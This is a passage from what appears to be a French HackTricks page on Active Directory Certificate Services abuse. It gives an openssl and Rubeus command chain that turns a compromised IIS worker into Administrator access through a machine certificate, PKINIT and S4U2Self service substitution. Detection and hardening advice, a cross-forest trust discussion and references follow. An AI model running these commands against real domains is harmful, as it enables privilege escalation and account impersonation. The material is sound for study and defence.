Générez la paire de clés et le CSR à distance du serveur IIS, puis conservez la clé privée. Soumettez **uniquement le CSR** depuis le worker compromis. Le [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancie `CertificateAuthority.Request`, définit `CertificateTemplate:Machine`, appelle `ICertRequest::Submit` et renvoie le certificat émis. Utilisez la chaîne de configuration de la CA `CAHOST\CA-NAME` ; un template `Machine` standard construit le sujet à partir d’AD, de sorte que les données de sujet/SAN fournies par le demandeur ne sont pas nécessaires.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Combinez le certificat renvoyé avec la **clé correspondante conservée**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` ne fonctionne que lorsque Windows peut déjà associer le certificat à une clé privée accessible ; pour des fichiers PEM séparés, créez explicitement le PKCS#12 :<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
Utilisez le PFX pour PKINIT et conservez le TGT de l’ordinateur obtenu au format base64 au lieu de l’injecter immédiatement :<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self et substitution de service sur le même hôte

S4U2Self permet à un service d’obtenir un ticket **vers lui-même** contenant les données d’autorisation d’un autre utilisateur. Avec le TGT de l’ordinateur, Rubeus peut demander ce ticket pour un utilisateur privilégié, réécrire le nom du service dans le KRB-CRED retourné en CIFS et l’injecter. Il s’agit de la primitive locale « delegate to thyself » : elle ne nécessite ni S4U2Proxy ni entrée `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Le ticket substitué ne peut être utilisé que par les services du **même compte/clé d’ordinateur** (ici, CIFS sur `HOST`). Il ne s’agit pas d’un ticket Administrator réutilisable sur d’autres machines du domaine. De plus, le résultat démontré correspond à un accès SMB/filesystem privilégié en tant qu’Administrator ; l’obtention d’un processus local `NT AUTHORITY\SYSTEM` nécessite encore une étape distincte de remote-execution.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Détection et hardening

- Sur la CA, corrélez les événements Certification Services **4886** (demande reçue) et **4887** (émise) afin de repérer les demandes inattendues utilisant le template `Machine` par des comptes de serveurs IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Sur les DC, l’événement **4768** contient des champs de certificat lorsqu’une certificate pre-authentication est utilisée ; déclenchez une alerte pour les demandes PKINIT TGT inhabituelles concernant des comptes de serveurs web. Effectuez ensuite une corrélation avec les demandes **4769** impliquant une identité privilégiée usurpée et le même hôte. Comme Rubeus `/altservice` réécrit le nom du service KRB-CRED côté client, n’exigez pas que le nom du service côté DC soit `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Recherchez les connexions de `w3wp.exe` aux endpoints RPC de la CA, la création inattendue de fichiers ASPX, les accès authentifiés par Kerberos aux partages administratifs et les activités de secrets-dumping. Limitez autant que possible l’accès de la couche applicative aux services RPC de la CA, au KDC et à SMB, et supprimez les droits d’enrollment des ordinateurs ou les templates d’authentification machine qui ne sont pas nécessaires au fonctionnement.<sup>[[19]](#references)</sup>

## Compromission de forests avec des certificats expliquée à la voix passive

### Rupture des trusts entre forests par des CA compromises

La configuration de l’**enrollment cross-forest** est rendue relativement simple. Le **certificat de la root CA** de la resource forest est **publié dans les account forests** par les administrateurs, et les certificats des **enterprise CA** de la resource forest sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA de chaque account forest**. En d’autres termes, cette configuration confère à la **CA de la resource forest un contrôle complet** sur toutes les autres forests pour lesquelles elle gère la PKI. Si cette CA est **compromise par des attaquants**, des certificats pour tous les utilisateurs des resource et account forests pourraient être **forgés par ceux-ci**, ce qui briserait la frontière de sécurité de la forest.<sup>[[6]](#references)</sup>

### Privilèges d’enrollment accordés à des foreign principals

Dans les environnements multi-forest, une attention particulière est requise concernant les Enterprise CA qui **publient des certificate templates** permettant aux **Authenticated Users ou aux foreign principals** (utilisateurs/groupes externes à la forest à laquelle appartient l’Enterprise CA) de disposer de **droits d’enrollment et de modification**.\
Lors d’une authentification à travers un trust, le **SID Authenticated Users** est ajouté au token de l’utilisateur par AD. Ainsi, si un domaine possède une Enterprise CA avec un template qui **accorde des droits d’enrollment à Authenticated Users**, un utilisateur provenant d’une autre forest pourrait potentiellement **s’inscrire à ce template**. De même, si des **droits d’enrollment sont explicitement accordés à un foreign principal par un template**, une **relation de contrôle d’accès cross-forest est ainsi créée**, permettant à un principal d’une forest de **s’inscrire à un template d’une autre forest**.

Les deux scénarios entraînent une **augmentation de la surface d’attaque** d’une forest à l’autre. Les paramètres du certificate template pourraient être exploités par un attaquant afin d’obtenir des privilèges supplémentaires dans un domaine étranger.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 dépôt PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - analyse technique de Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned : Abus des Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0 : ESC9, ESC10, interface graphique BloodHound, nouvelles méthodes d’authentification et de demande, et plus encore](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials : abus du mapping de comptes Key Trust pour la prise de contrôle de comptes](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – L’histoire de l’utilisation (abusive) de Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying vers les Active Directory Certificate Services via RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12 : accès shell à une CA ADCS avec YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Technique d’abus ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Technique d’abus ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Élévation de privilèges (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu : pas seulement un autre AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16 : mauvaise configuration et exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Réexamen de « Delegate 2 Thyself »](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC d’enrollment IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Élévation de privilèges depuis IIS AppPool via l’endpoint RPC AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identités des application pools](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – commande pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Auditer les Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Événement 4768 : un ticket d’authentification Kerberos a été demandé](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Événement 4769 : un ticket de service Kerberos a été demandé](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – toolkit d’exploitation AD CS PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
